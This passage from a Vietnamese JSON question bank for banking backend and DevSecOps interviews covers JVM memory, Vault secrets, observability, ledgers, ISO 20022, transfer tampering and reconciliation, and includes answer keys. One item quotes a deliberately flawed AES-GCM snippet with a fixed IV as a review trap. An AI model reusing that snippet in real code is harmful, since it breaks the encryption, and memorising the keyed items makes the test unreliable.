          "whyCorrect": "Giải thích quá thuyết phục! Đây là câu hỏi phỏng vấn DevOps/Java kinh điển phân biệt người hiểu sâu JVM Memory Model với người chỉ quen biết mỗi vùng Heap: `-Xmx` CHỈ giới hạn duy nhất vùng **Java Heap**, hoàn toàn không tính đến **Metaspace** (~150–250MB cho ứng dụng Spring Boot lớn), **Direct ByteBuffers** của Netty/Kafka/JDBC, **Thread Stacks** (~1MB mỗi Platform Thread), **JIT CodeCache** và cấu trúc dữ liệu nội bộ của **Garbage Collector**! Khi Heap chạm 1.9GB cộng thêm 400MB Non-Heap = 2.3GB > trần cgroup `2Gi`, nhân Linux lạnh lùng hạ sát tiến trình bằng `SIGKILL (128 + 9 = 137)` ngay tức khắc nên JVM không kịp thở ra một dòng log nào! Dành khoảng `65%–75%` cho Heap (`-XX:MaxRAMPercentage=70.0`), giới hạn `MaxMetaspaceSize` / `MaxDirectMemorySize` hợp lý, kết hợp chạy `non-root user` + Spring Boot Layered JARs là công thức chuẩn Production.",
          "whyWrong": [
            "Java 21 LTS hỗ trợ nhận diện container cgroups v1 và cgroups v2 cực kỳ hoàn chỉnh ngay từ mặc định (`+UseContainerSupport`).",
            "Bỏ hẳn giới hạn bộ nhớ trên cụm dùng chung của ngân hàng sẽ gây hiệu ứng 'Noisy Neighbor' làm một dịch vụ phụ rò rỉ RAM kéo chết luôn cả Node chứa dịch vụ thanh toán lõi.",
            "`Exit Code 137` là mã của tín hiệu `SIGKILL` từ hệ điều hành do vượt ngưỡng giới hạn bộ nhớ container, không liên quan gì tới việc Linux xóa container theo chu kỳ thời gian.",
            ""
          ],
          "tip": "Thấy `Container memory limit = X` mà đặt `-Xmx = X` dẫn tới `Exit Code 137 (OOMKilled)` -> Nhớ ngay phương trình ngân sách bộ nhớ: `Total RSS = Heap + Metaspace + Direct Memory + Thread Stacks + GC/JIT` -> Chỉ cấp ~70% RAM Pod cho Heap!"
        }
      },
      {
        "id": "R3-16",
        "domain": "DevSecOps Ngân hàng, CI/CD & HashiCorp Vault (O3)",
        "lessonId": "O3",
        "difficulty": "Trung bình",
        "caseStudy": null,
        "question": "Khi kiểm tra kho mã nguồn GitLab của dự án Payment Gateway, bộ phận An ninh thông tin phát hiện file `k8s/prod-secret.yaml` lưu mật khẩu tài khoản quản trị PostgreSQL Production dưới dạng chuỗi Base64 cố định suốt 3 năm chưa từng đổi, và pipeline CI/CD cho phép build thẳng Docker Image lên Production dù thư viện phụ thuộc dính lỗ hổng Critical CVE. Bạn thiết kế lại quy trình DevSecOps như thế nào?",
        "options": [
          "Nén file `prod-secret.yaml` thành tệp `.zip` có đặt mật khẩu là tên dự án trước khi đẩy lên GitLab để công cụ quét không đọc được.",
          "Tắt tính năng quét lỗ hổng trong giờ hành chính vì làm chậm pipeline thêm 90 giây và đổi chuỗi Base64 sang Base32 để tăng độ bảo mật.",
          "Thiết lập cổng kiểm soát chất lượng bảo mật bắt buộc (Quality Gates) trên CI/CD gồm Secret Detection (Gitleaks), SAST (Semgrep/SonarQube), SCA quét thư viện & Container Image (Trivy chặn tự động mọi CVE mức Critical/High), ký số xác thực Image (Cosign); đồng thời tích hợp **HashiCorp Vault Dynamic Database Secrets** (cấp tài khoản DB tạm thời có đặc quyền tối thiểu kèm Lease TTL ngắn tự động xoay vòng/thu hồi, không lưu bất kỳ mật khẩu tĩnh nào trên Git!).",
          "Gửi mật khẩu Database Production qua nhóm chat chung của 60 lập trình viên mỗi thứ Hai đầu tuần để từng người gõ tay vào Pod."
        ],
        "answer": 2,
        "walkthrough": {
          "keyword": "prod-secret.yaml lưu mật khẩu PostgreSQL dạng Base64 suốt 3 năm trên Git ... thư viện dính Critical CVE vẫn lên Production",
          "whyCorrect": "Chuẩn chỉnh chuẩn mực DevSecOps cấp độ tổ chức tài chính! Rất nhiều lập trình viên ngây thơ tưởng `Kubernetes Secret` mã hóa dữ liệu, trong khi mặc định nó chỉ là **Base64 Encoding** (`echo ... | base64 -d` là hiện nguyên hình mật khẩu sau nửa giây!). Đẩy file đó lên Git đồng nghĩa mọi nhân viên cũ đã nghỉ việc 2 năm trước từng clone repo vẫn nắm mật khẩu DB Production! Giải pháp hiện đại nhất là dùng **HashiCorp Vault Database Secrets Engine**: mỗi khi Pod Payment Gateway khởi chạy, nó xác thực danh tính Kubernetes ServiceAccount với Vault để nhận một cặp `(username, password)` **sinh động tức thời (Dynamic Secret)** chỉ có quyền `SELECT, INSERT` trên đúng schema cần thiết và tự hủy khi hết phiên, kết hợp chặn cứng CVE Critical ngay trên CI/CD bằng SAST + SCA + Image Signing.",
          "whyWrong": [
            "Đẩy file zip chứa thông tin xác thực Production lên Git vẫn vi phạm nghiêm trọng nguyên tắc Zero-Secret trong mã nguồn và không giải quyết được việc mật khẩu tĩnh tồn tại nhiều năm.",
            "Base64 hay Base32 đều chỉ là bảng mã biểu diễn ký tự (encoding) chứ hoàn toàn KHÔNG phải thuật toán mã hóa bảo mật (encryption).",
            "",
            "Chia sẻ mật khẩu Production qua nhóm chat cho 60 người và thao tác thủ công trên Pod Production vi phạm trực tiếp mọi quy định PCI-DSS, ISO 27001 và nguyên tắc phân tách nhiệm vụ (Segregation of Duties)."
          ],
          "tip": "Base64 KHÔNG PHẢI là mã hóa! Chuẩn DevSecOps Ngân hàng = `Git Secret Scan + SAST + SCA (Trivy block Critical CVE) + Image Signing` + `HashiCorp Vault Dynamic Secrets`!"
        }
      },
      {
        "id": "R3-17",
        "domain": "Observability: P99 Histogram & OpenTelemetry (O4)",
        "lessonId": "O4",
        "difficulty": "Trung bình",
        "caseStudy": null,
        "question": "Trên màn hình giám sát Grafana của dịch vụ Chuyển tiền nhanh, biểu đồ 'Độ trễ trung bình (Average Latency)' cả buổi sáng hiển thị mức xanh đẹp mắt là 95 mili-giây, nhưng trên mạng xã hội lại có hàng nghìn khách hàng VIP bức xúc phản ánh App quay vòng tròn suốt 18 giây mới chuyển tiền xong! Đồng thời, khi giao dịch đi từ API Gateway -> Payment Service -> Kafka -> Core Ledger, đội vận hành không thể nối vết được một giao dịch qua các dịch vụ. Bạn cải tiến hệ thống Observability như thế nào?",
        "options": [
          "Xóa bớt log của khách hàng VIP để biểu đồ không bị nhiễu và đổi chu kỳ làm mới màn hình Grafana từ 15 giây lên 1 giờ.",
          "Thay chỉ số trung bình đơn thuần bằng **Percentile Histogram (`P95`, `P99`, `P99.9` dùng Micrometer `publishPercentileHistogram` / SLO Buckets)** gắn nhãn nghiệp vụ có số lượng giá trị hữu hạn (như `dest_bank_bin`, `status`, tránh gắn `txn_id` làm nổ Cardinality Prometheus), đồng thời tích hợp **OpenTelemetry Context Propagation** tự động truyền `traceparent` (`traceId` + `spanId` chuẩn W3C) xuyên qua HTTP Header lẫn **Kafka Record Headers** để dựng bức tranh Distributed Tracing đầu-cuối.",
          "Gắn trực tiếp `userId`, `accountNo` và `transactionId` làm nhãn (label/tag) trên từng metric của Prometheus cho 10 triệu giao dịch mỗi ngày.",
          "Chỉ cần đo mức sử dụng CPU trung bình của máy chủ; hễ CPU dưới 50% thì khẳng định chắc chắn hệ thống không thể bị chậm."
        ],
        "answer": 1,
        "walkthrough": {
          "keyword": "Average Latency hiển thị 95ms nhưng hàng nghìn khách hàng phải chờ 18 giây ... đi qua HTTP -> Kafka -> Core Ledger không nối vết được",
          "whyCorrect": "Câu chuyện thực tế 100% ở mọi phòng NOC ngân hàng! Hãy làm một phép toán nhỏ: trong 100 giao dịch, nếu 99 giao dịch chạy mất `10ms` nhưng có 1 giao dịch bị kẹt khóa/retry mất `8.510ms` (8,5 giây), thì trung bình cộng vẫn chỉ là `(99*10 + 8510)/100 = 95ms`! Với lưu lượng 3,5 triệu giao dịch/ngày, 1% đuôi chậm (**Tail Latency P99**) tương đương **35.000 lượt khách hàng** bị trải nghiệm tồi tệ mỗi ngày mà biểu đồ Average hoàn toàn mù tịt! Bên cạnh việc đo Histogram `P95/P99` (chú ý chỉ gắn tag có tập giá trị nhỏ như mã BIN ngân hàng để tránh **High Cardinality** làm sập TSDB Prometheus), việc nhúng W3C `traceparent` vào cả HTTP Header và **Kafka Message Header** giúp Jaeger/Tempo nối liền mạch 1 sợi dây duy nhất từ lúc khách chạm màn hình tới lúc ghi xong sổ cái!",
          "whyWrong": [
            "Che giấu dữ liệu giám sát không giải quyết được nỗi đau khách hàng đang bị nghẽn thực sự trên Production.",
            "",
            "Đưa `transactionId` hoặc `accountNo` (hàng triệu giá trị khác nhau) vào làm Label của Prometheus sẽ gây thảm họa **High-Cardinality Explosion**, tạo ra hàng chục triệu chuỗi thời gian (time-series) làm tràn sạch bộ nhớ máy chủ Prometheus chỉ sau vài giờ! (`txnId` phải nằm trong Log và Trace, không nằm trong Metric label!).",
            "Khi luồng bị treo chờ khóa Database hoặc chờ kết nối mạng đối tác (I/O Wait / Lock Contention), CPU vẫn rảnh rỗi ở mức 5–10% trong khi độ trễ giao dịch vọt lên hàng chục giây!"
          ],
          "tip": "Ba nguyên tắc vàng Observability Ngân hàng: (1) Đánh giá SLA bằng `P95 / P99 Histogram`, đừng tin `Average`; (2) Cấm nhét `txnId / userId` vào Prometheus Metric Tag (High Cardinality!); (3) Nối vết bất đồng bộ qua `W3C traceparent` trong Kafka Headers!"
        }
      },
      {
        "id": "R3-18",
        "domain": "Chẩn đoán Sự cố Production: Thread Dump & JFR (O5)",
        "lessonId": "O5",
        "difficulty": "Khó (Thực chiến trực chiến)",
        "caseStudy": null,
        "question": "Lúc 09h45 sáng thứ Hai cao điểm, 1 trong 10 Pod của dịch vụ Core Account bị treo cứng (không xử lý được request, P99 vọt lên 30s, CPU chỉ ở mức 8%), trong khi 9 Pod còn lại vẫn đang chớm có dấu hiệu tăng thời gian chờ tương tự. Một thành viên trong ca trực định chạy lệnh `kubectl delete pod` xóa ngay Pod đó đi cho nhanh. Là Trưởng ca kỹ thuật (Incident Commander), quyết định nào của bạn đúng chuẩn SRE nhất?",
        "options": [
          "Đồng ý xóa ngay Pod đó và viết một Cronjob tự động restart toàn bộ 10 Pod cứ mỗi 15 phút một lần để giấu lỗi tạm thời.",
          "Tăng giới hạn thời gian chờ HTTP Timeout của API Gateway từ 10 giây lên 600 giây để khách hàng kiên nhẫn đợi lâu hơn.",
          "Bật chế độ Debug Debugger từ xa (JDWP Remote Debugging) đặt Breakpoint dừng toàn bộ các luồng trên cả 10 Pod Production đang chạy thật để dò từng dòng code.",
          "Cập nhật nhãn (label) của Pod bị treo để **cắt nó ra khỏi Service Load Balancer** (ngừng đẩy giao dịch khách hàng mới vào Pod đó để cầm máu tức thì mà tiến trình JVM vẫn còn nguyên hiện trường), sau đó chạy ngay `jcmd <pid> Thread.print` (lấy 3 bản Thread Dump cách nhau 5 giây) và ghi nhanh 60 giây **Java Flight Recorder (JFR)** đưa ra volume an toàn để bắt tận tay hàm đang giữ khóa / rò rỉ kết nối HikariCP trước khi thu hồi Pod."
        ],
        "answer": 3,
        "walkthrough": {
          "keyword": "1 trong 10 Pod bị treo cứng (CPU chỉ 8%) ... 9 Pod còn lại chớm có dấu hiệu tương tự ... định chạy kubectl delete pod xóa ngay",
          "whyCorrect": "Bản lĩnh của một Senior từng trực chiến sự cố Production toát lên ngay ở thao tác này! Hãy chú ý chi tiết: *CPU chỉ 8% mà luồng treo cứng + 9 Pod kia cũng đang chớm bị y hệt* -> đây là dấu hiệu đặc trưng 99% của **Deadlock, Lock Contention hoặc Connection Pool Starvation (quên đóng kết nối / gọi HTTP trong `@Transactional`)**! Nếu vội vàng bấm `delete pod` ngay khi chưa lưu bằng chứng, em làm bay màu toàn bộ hiện trường quý giá trong RAM, và chỉ 10 phút sau cả 9 Pod còn lại cùng treo cứng mà cả đội mù tịt không biết hàm nào gây ra! Cắt nhãn Pod khỏi `Service` selector giúp **vừa cô lập không làm hỏng thêm giao dịch khách hàng nào trong 1 giây, vừa giữ sống 'hiện trường' để chụp 3 bản Thread Dump liên tiếp + JFR** tìm chính xác dòng code đang `WAITING` / `BLOCKED`!",
          "whyWrong": [
            "Xóa Pod ngay làm mất sạch dấu vết Thread Stack đang bị kẹt, còn restart định kỳ trên hệ thống tài chính chỉ làm giao dịch đứt quãng liên miên mà không sửa được lỗi rò rỉ tài nguyên.",
            "Kéo dài Timeout lên 10 phút khi hệ thống đang nghẽn sẽ giữ rịt hàng vạn luồng/socket trên API Gateway, gây hiệu ứng sập dây chuyền (Cascading Failure) lan ra toàn bộ ngân hàng số.",
            "Mở cổng JDWP Remote Debugger và đặt Breakpoint dừng luồng trên Production ngân hàng là hành vi bị cấm tuyệt đối về cả an ninh lẫn vận hành vì làm đóng băng toàn bộ tiến trình xử lý giao dịch thật.",
            ""
          ],
          "tip": "Quy trình Vàng xử lý Pod treo (CPU thấp, Latency vọt cao): **Cô lập Pod khỏi tải mới (Isolate Label / Readiness)** -> **Chụp 3 bản `jcmd Thread.print` cách nhau 5s + JFR** -> **Tìm dòng code giữ Lock/Connection** -> Rồi mới hủy Pod!"
        }
      },
      {
        "id": "R3-19",
        "domain": "Sổ cái Bất biến & Bút toán Đảo chiều (B1)",
        "lessonId": "B1",
        "difficulty": "Trung bình",
        "caseStudy": null,
        "question": "Một giao dịch thu phí thường niên thẻ 220.000 VNĐ đã được ghi nhận vào Sổ cái (bảng `journals` và `ledger_postings`) ngày hôm qua, nhưng hôm nay bộ phận Chăm sóc khách hàng phê duyệt hoàn lại khoản phí này theo chương trình miễn phí cho khách hàng ưu tiên. Thao tác dữ liệu nào trên Core Ledger là ĐÚNG chuẩn kế toán ngân hàng?",
        "options": [
          "Chạy câu lệnh `DELETE FROM ledger_postings WHERE journal_id = ...` để xóa sạch dấu vết giao dịch thu phí ngày hôm qua rồi cộng trả lại 220.000 VNĐ vào cột số dư tài khoản.",
          "Chạy câu lệnh `UPDATE ledger_postings SET amount = 0` trên bản ghi của ngày hôm qua để báo cáo hôm qua tự lùi số tiền về 0.",
          "Giữ nguyên bất biến 100% bút toán gốc của ngày hôm qua (Append-only Immutable Ledger), và tạo mới một `Reversing / Refund Journal` ở ngày hạch toán hôm nay có tham chiếu `original_journal_id`, sinh cặp dòng Posting ngược chiều cân bằng (Nợ tài khoản GL Doanh thu phí / Thuế VAT 220.000 VNĐ — Có tài khoản CASA khách hàng 220.000 VNĐ).",
          "Tạo một bản ghi Posting đơn lẻ chỉ có vế Có cộng 220.000 VNĐ cho khách hàng mà không cần vế Nợ đối ứng từ tài khoản nội bộ GL của ngân hàng."
        ],
        "answer": 2,
        "walkthrough": {
          "keyword": "giao dịch thu phí đã ghi vào Sổ cái ngày hôm qua ... hôm nay phê duyệt hoàn lại ... chuẩn kế toán ngân hàng",
          "whyCorrect": "Trong kế toán ngân hàng, bảng `ledger_postings` không có khái niệm tẩy xóa lịch sử — thậm chí tài khoản Database của ứng dụng Core Ledger thường bị thu hồi quyền `UPDATE` và `DELETE` trên bảng bút toán bằng Database Trigger / Privilege! Ngày hôm qua đã chốt sổ cuối ngày (EOD Cut-off) và báo cáo lên Ngân hàng Nhà nước xong xuôi; nếu sửa hay xóa lùi vào quá khứ sẽ làm lệch toàn bộ số dư đầu kỳ hôm nay. Do đó, mọi nghiệp vụ hủy/hoàn đều phải thực hiện bằng cách **ghi thêm một bút toán đảo chiều (Reversal / Refund Entry) mới** ở kỳ hiện tại, gắn liên kết `original_journal_id` rõ ràng và đảm bảo cân bằng Nợ - Có tuyệt đối.",
          "whyWrong": [
            "Xóa vật lý bản ghi sổ cái đã hạch toán là hành vi bị cấm tuyệt đối trong tài chính ngân hàng, làm sai lệch sao kê quá khứ và trượt kiểm toán độc lập ngay lập tức.",
            "Sửa `amount = 0` trên bút toán ngày hôm qua phá vỡ báo cáo chốt sổ EOD đã khóa kỳ kế toán.",
            "",
            "Ghi đơn 1 vế (Single-entry) làm tổng Có toàn ngân hàng lớn hơn tổng Nợ đúng 220.000 VNĐ, phá vỡ bảng cân đối kế toán tổng hợp (Trial Balance)."
          ],
          "tip": "Luật bất thành văn của Core Ledger: `ledger_postings` là **Append-Only (chỉ có INSERT, cấm UPDATE/DELETE)**! Muốn sửa sai hay hoàn tiền -> Luôn sinh **Bút toán đảo chiều mới (Reversal Journal)** gắn mã tham chiếu gốc!"
        }
      },
      {
        "id": "R3-20",
        "domain": "Chuẩn Điện Thanh toán Quốc tế ISO 20022 (B2)",
        "lessonId": "B2",
        "difficulty": "Trung bình",
        "caseStudy": null,
        "question": "Ngân hàng đang nâng cấp cổng thanh toán liên ngân hàng và thanh toán xuyên biên giới theo chuẩn thông điệp cấu trúc giàu dữ liệu **ISO 20022** (thay thế dần chuẩn MT cũ và bổ sung cho thanh toán tức thời). Bạn hãy ghép đúng vai trò của bộ 3 mã thông điệp cốt lõi `pacs.008`, `pacs.002` và `camt.053` trong luồng hạch toán và đối soát?",
        "options": [
          "`pacs.008` dùng để khóa thẻ ATM, `pacs.002` dùng để mở tài khoản tiết kiệm và `camt.053` dùng để đổi mã PIN tại cây rút tiền.",
          "Cả 3 mã `pacs.008`, `pacs.002` và `camt.053` đều là các trường Bitmap nhị phân 64-bit nằm bên trong thông điệp ISO 8583 phiên bản 1987.",
          "`pacs.008` là bảng sao kê cuối năm, `pacs.002` là lệnh trích nợ tự động hóa đơn điện và `camt.053` là lệnh khởi tạo chuyển tiền nhanh tức thời.",
          "`pacs.008` (FIToFICustomerCreditTransfer) truyền lệnh chuyển tiền ghi Có của khách hàng giữa các tổ chức tài chính; `pacs.002` (FIToFIPaymentStatusReport) báo cáo trạng thái chấp nhận/từ chối giao dịch thanh toán; và `camt.053` (BankToCustomerStatement) cung cấp bảng sao kê chốt sổ tài khoản cuối kỳ phục vụ đối soát tự động."
        ],
        "answer": 3,
        "walkthrough": {
          "keyword": "chuẩn ISO 20022 ... vai trò của bộ 3 mã thông điệp cốt lõi pacs.008, pacs.002 và camt.053",
          "whyCorrect": "Nắm chắc từ vựng ISO 20022 là điểm cộng cực lớn khi phỏng vấn vào khối Thanh toán Quốc tế, SWIFT MX và thế hệ chuyển mạch mới! Em chỉ cần nhớ tiền tố miền nghiệp vụ của ISO 20022 cực dễ hiểu: nhóm **`pacs` (Payments Clearing and Settlement)** xử lý thanh toán bù trừ liên ngân hàng — trong đó **`pacs.008`** là lệnh chuyển tiền khách hàng giữa hai ngân hàng (thay thế SWIFT MT103), **`pacs.002`** là thông điệp phản hồi trạng thái giao dịch thành công/từ chối kèm mã lý do chi tiết, còn **`pacs.004`** là hoàn trả (PaymentReturn); nhóm **`camt` (Cash Management)** quản lý tiền tệ & báo cáo — trong đó **`camt.053`** chính là bản sao kê tài khoản chính thức cuối ngày (thay thế MT940) mà hệ thống Đối soát T+1 đọc vào để khớp sổ Nostro!",
          "whyWrong": [
            "Giao dịch tại thiết bị đầu cuối ATM/POS thuộc miền thẻ (ISO 8583 hoặc nhóm `caaa`/`catm`), không phải ý nghĩa của `pacs.008` hay `camt.053`.",
            "ISO 20022 sử dụng lược đồ cấu trúc có phân cấp rõ ngữ nghĩa (XML XSD / JSON Schema) chứ không phải các trường Bitmap nhị phân của ISO 8583.",
            "Đảo ngược hoàn toàn vai trò giữa nhóm khởi tạo thanh toán liên ngân hàng (`pacs.008`) và nhóm sao kê quản lý dòng tiền (`camt.053`).",
            ""
          ],
          "tip": "Mẹo nhớ nhanh ISO 20022 trong 10 giây: `pacs.008` = Lệnh chuyển tiền đi (thay MT103); `pacs.002` = Báo trạng thái thanh toán; `camt.053` = Sao kê chốt sổ đối soát cuối ngày (thay MT940)!"
        }
      },
      {
        "id": "R3-21",
        "domain": "Luồng Inquiry → Transfer Liên Ngân hàng (B3)",
        "lessonId": "B3",
        "difficulty": "Khó (Bẫy bảo mật nghiệp vụ)",
        "caseStudy": null,
        "question": "Trong luồng chuyển tiền nhanh NAPAS 24/7 trên ứng dụng Ngân hàng số: ở Bước 1 (Account Inquiry), khách hàng gõ số tài khoản nhận `1903668899` tại ngân hàng bạn và màn hình hiển thị tên người thụ hưởng 'NGUYEN VAN AN'. Ở Bước 2 (Fund Transfer), kẻ tấn công dùng công cụ chặn sửa request (Proxy/MitM nội bộ thiết bị root) giữ nguyên tên hiển thị trên UI nhưng đổi tham số `toAccountNo` trong body API `/transfer` sang tài khoản kẻ lừa đảo `1903000666` trước khi ký xác nhận hoặc lợi dụng API `/transfer` không đối chiếu lại phiên tra vấn. Thiết kế Backend nào kín kẽ nhất?",
        "options": [
          "Ở Bước 1 (Inquiry), Backend lưu tạm thông tin phiên tra vấn đã xác thực (`inquiryToken` gắn chặt với `authenticatedCif + destBankBin + toAccountNo + beneficiaryName`, có TTL ngắn 3–5 phút trên Redis); ở Bước 2 (Transfer) và bước sinh Smart OTP, Backend bắt buộc đối chiếu `inquiryToken` khớp chính xác với cặp `(destBankBin, toAccountNo)` được ký trong OTP và hiển thị lại tên người thụ hưởng đã xác minh trên màn hình ký xác nhận.",
          "Tin tưởng hoàn toàn trường `beneficiaryName` do Frontend gửi lên trong body của API `/transfer` mà không cần kiểm tra xem `toAccountNo` có từng được tra vấn hợp lệ hay chưa.",
          "Bỏ hẳn bước tra vấn tên người nhận (Account Inquiry) để tiết kiệm 1 lần gọi mạng sang cổng NAPAS.",
          "Lưu toàn bộ danh sách 120 triệu tài khoản của tất cả các ngân hàng khác tại Việt Nam vào một file cứng trên ứng dụng Mobile để tra cứu ngoại tuyến."
        ],
        "answer": 0,
        "walkthrough": {
          "keyword": "Bước 1 (Account Inquiry) ... Bước 2 (Fund Transfer) đổi tham số toAccountNo sang tài khoản khác",
          "whyCorrect": "Tư duy phòng thủ chiều sâu (Defense-in-Depth) rất sắc bén! Trong luồng IBFT 24/7, bước Inquiry không chỉ để 'hiển thị tên cho đẹp' trên giao diện, mà còn trả về mã tham chiếu phiên tra vấn và xác nhận tài khoản đích có hiệu lực nhận tiền tại ngân hàng bạn. Nếu hai API `/inquiry` và `/transfer` rời rạc không ràng buộc trạng thái (Broken Business Flow / Parameter Tampering), kẻ tấn công có thể gọi `/inquiry` cho tài khoản A rồi đẩy lệnh `/transfer` sang tài khoản B (hoặc dùng API `/transfer` làm công cụ rà quét tài khoản không qua kiểm soát). Ràng buộc **`inquiryToken` có chữ ký/lưu Redis ngắn hạn khớp chặt `(cif, bankBin, toAccountNo, verifiedName)`** kết hợp đưa cả `toAccountNo` + `verifiedName` lên màn hình xác thực Smart OTP khóa chặt mọi kẽ hở tráo đổi giữa 2 bước!",
          "whyWrong": [
            "",
            "Tin trường `beneficiaryName` từ Client gửi lên là vô nghĩa vì kẻ gian gửi `toAccountNo` của chúng kèm chuỗi tên giả `'NGUYEN VAN AN'`, trong khi chuyển mạch liên ngân hàng hạch toán theo số tài khoản và mã BIN!",
            "Bỏ bước Account Inquiry vi phạm quy chuẩn quy trình IBFT 24/7 của NAPAS và làm tăng vọt tỷ lệ khách chuyển nhầm tiền hoặc chuyển vào tài khoản đã đóng/bị khóa.",
            "Không một ngân hàng nào được chia sẻ hay lưu danh sách toàn bộ tài khoản của các ngân hàng khác vì bí mật dữ liệu ngân hàng và tài khoản đóng/mở mới liên tục từng giây."
          ],
          "tip": "Mọi quy trình tài chính nhiều bước (`Inquiry -> Confirm -> Transfer`) đều phải ràng buộc trạng thái phía Server bằng `Session/Inquiry Token` có TTL ngắn gắn chặt với các tham số định danh gốc!"
        }
      },
      {
        "id": "R3-22",
        "domain": "Xử lý Lệch Đối soát & Hạch toán Quyết toán (B4)",
        "lessonId": "B4",
        "difficulty": "Trung bình",
        "caseStudy": null,
        "question": "Sau khi chạy Job Đối soát T+1 buổi sáng cho chiều Chuyển tiền đi (Issuing/Sender Bank), hệ thống phát hiện một giao dịch 50.000.000 VNĐ ngày hôm qua từng bị Timeout nên đang nằm ở tài khoản treo trung gian `Suspense GL` (đã trích Nợ CASA của người gửi, Có `Suspense GL`). Trong file quyết toán chính thức `camt.053`/CSV của NAPAS sáng nay, giao dịch này **KHÔNG HỀ TỒN TẠI** (trạng thái xác nhận cuối cùng: chuyển mạch chưa ghi nhận thanh toán và đã quá cửa sổ hạch toán). Bút toán xử lý lệch chuẩn xác là gì?",
        "options": [
          "Sinh bút toán tất toán hoàn tiền có phê duyệt tự động theo quy tắc đối soát: Ghi **Nợ (Debit) tài khoản `Suspense GL` 50.000.000 VNĐ — Ghi Có (Credit) tài khoản CASA người gửi 50.000.000 VNĐ** (kèm hoàn phí nếu có), cập nhật trạng thái giao dịch từ `PENDING_RECONCILIATION` sang `REFUNDED_AFTER_RECON` và gửi thông báo biến động số dư cho khách.",
          "Ghi Nợ trực tiếp vào tài khoản chi phí lỗ hoạt động của ngân hàng 50.000.000 VNĐ để trả cho khách, còn 50.000.000 VNĐ trong `Suspense GL` cứ để treo vĩnh viễn không bao giờ động tới.",
          "Tiếp tục giữ nguyên số tiền của khách trong tài khoản `Suspense GL` suốt 5 năm cho tới khi khách hàng tự phát hiện và làm đơn khiếu nại giấy tại quầy.",
          "Tự ý bắn lại lệnh chuyển tiền 50.000.000 VNĐ đi lần nữa vào sáng hôm sau mà không hỏi ý kiến khách hàng dù khách đã tự chuyển khoản khác từ tối hôm qua rồi."
        ],
        "answer": 0,
        "walkthrough": {
          "keyword": "giao dịch chiều đi hôm qua bị Timeout đang treo ở Suspense GL ... file quyết toán chính thức sáng nay xác nhận KHÔNG TỒN TẠI (chưa thanh toán)",
          "whyCorrect": "Em thấy vẻ đẹp kỳ diệu của tài khoản **`Suspense GL` (Tài khoản trung gian chờ xử lý)** chưa! Hôm qua lúc bị Timeout, ngân hàng đã hạch toán: `Nợ CASA khách 50tr / Có Suspense GL 50tr` -> tiền của khách được giữ an toàn trong két sắt trung gian. Sáng nay T+1: (TH1) Nếu file quyết toán NAPAS báo giao dịch **Thành công**, ta tất toán `Nợ Suspense GL 50tr / Có Nostro Quyết toán NAPAS 50tr` (khớp hoàn hảo!); (TH2 - chính là câu hỏi này) File quyết toán chính thức xác nhận **Giao dịch không thành công tại chuyển mạch**, ta giải tỏa `Nợ Suspense GL 50tr / Có CASA khách 50tr` trả lại đủ 100% gốc + phí cho khách hàng ngay lập tức trong phiên T+1! Số dư tài khoản `Suspense GL` quay về đúng `0 đồng`, không thừa không thiếu một xu!",
          "whyWrong": [
            "",
            "Lấy chi phí ngân hàng ra đền trong khi tiền của chính giao dịch đó vẫn đang nằm nguyên trong `Suspense GL` là hạch toán sai hoàn toàn bản chất kế toán, vừa lỗ ảo vừa làm tồn đọng số dư rác trên tài khoản trung gian.",
            "Giam tiền của khách hàng không hoàn trả sau khi đã có kết quả đối soát chính thức T+1 vi phạm nghiêm trọng quy định của NHNN về thời hạn tra soát, hoàn trả giao dịch thanh toán.",
            "Tự động bắn lại lệnh chuyển tiền sang ngày hôm sau cho một giao dịch tức thời 24/7 từng bị treo là cực kỳ nguy hiểm vì tối hôm qua khách thường đã dùng nguồn tiền khác thanh toán cho đối tác rồi -> gây chuyển trùng tiền!"
          ],
          "tip": "Nhớ quy luật cân bằng tài khoản treo `Suspense GL`: Cuối mỗi chu kỳ đối soát T+1, các khoản treo phải được giải quyết sạch về 0: hoặc đi tiếp sang `Nostro Quyết toán` (nếu đối tác thành công), hoặc đảo về `CASA Khách hàng` (nếu đối tác thất bại)!"
        }
      },
      {
        "id": "R3-23",
        "domain": "Bẫy Mật mã học khi viết JPA AttributeConverter (K3)",
        "lessonId": "K3",
        "difficulty": "Khó (Bẫy code mật mã)",
        "caseStudy": null,
        "question": "Khi review một class `SalaryEncryptionConverter implements AttributeConverter<String, String>` dùng để mã hóa cột mức lương và số dư thấu chi trong DB, bạn thấy tác giả viết: `Cipher cipher = Cipher.getInstance(\"AES/GCM/NoPadding\"); cipher.init(Cipher.ENCRYPT_MODE, secretKey, new GCMParameterSpec(128, \"123456789012\".getBytes()));`. Tại sao đoạn code này phải bị chặn khẩn cấp (Block Merge Request) ngay lập tức?",
        "options": [
          "Vì độ dài thẻ xác thực (Authentication Tag) 128 bit trong `GCMParameterSpec` là quá dài, chuẩn ngân hàng bắt buộc phải giảm xuống còn 8 bit.",
          "Vì chế độ dòng xác thực `AES-GCM` dùng cố định cùng một hằng số IV `\"123456789012\"` cho mọi bản ghi với cùng `secretKey` sẽ gây lỗi **Two-Time Pad / Nonce Reuse**: hai nhân viên có cùng mức lương sẽ sinh ra bản mã giống hệt nhau, và kẻ tấn công chỉ cần lấy phép `XOR` giữa hai bản mã bất kỳ là triệt tiêu hoàn toàn dòng khóa (keystream) để khôi phục nội dung rõ lẫn khóa xác thực GHASH! Phải sinh ngẫu nhiên 12 bytes bằng `SecureRandom` cho mỗi lần mã hóa và ghép `[IV 12 bytes || Ciphertext+Tag]` khi lưu.",
          "Vì class `Cipher` của JDK là biến toàn cục dùng chung tự động an toàn đa luồng (`Thread-safe`) nên gọi `Cipher.getInstance` bên trong hàm làm tốn bộ nhớ vô ích, phải khai báo `private static final Cipher` dùng chung cho 200 luồng cùng gọi `doFinal` một lúc.",
          "Vì Java 21 đã cấm hoàn toàn thuật toán AES-256 và bắt buộc chuyển sang dùng DES 56-bit."
        ],
        "answer": 1,
        "walkthrough": {
          "keyword": "AES/GCM/NoPadding ... new GCMParameterSpec(128, \"123456789012\".getBytes())",
